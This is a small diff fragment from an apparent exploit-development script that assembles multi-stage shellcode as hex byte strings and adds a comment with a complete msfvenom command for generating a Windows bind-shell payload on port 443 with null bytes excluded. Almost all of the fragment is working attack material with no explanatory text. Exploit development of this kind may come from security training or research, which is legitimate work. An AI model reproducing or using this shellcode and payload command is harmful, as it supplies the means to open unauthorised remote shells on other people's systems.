@@ -50,7 +50,7 @@ stage3 += "\x05\x40\x75\x54\x06"           #
 stage3 += "\x50"                           # PUSH EAX
 
 # 4th Stage Shellcode (Bind Shell)
-# 
+# msfvenom -p windows/shell_bind_tcp LHOST=127.0.0.1 LPORT=443 BUFFERREGISTER=esp EXITFUNC=thread -f c -b "\x00"
 
 stage4 = ""
 stage4 += "\x54"                           # PUSH ESP 
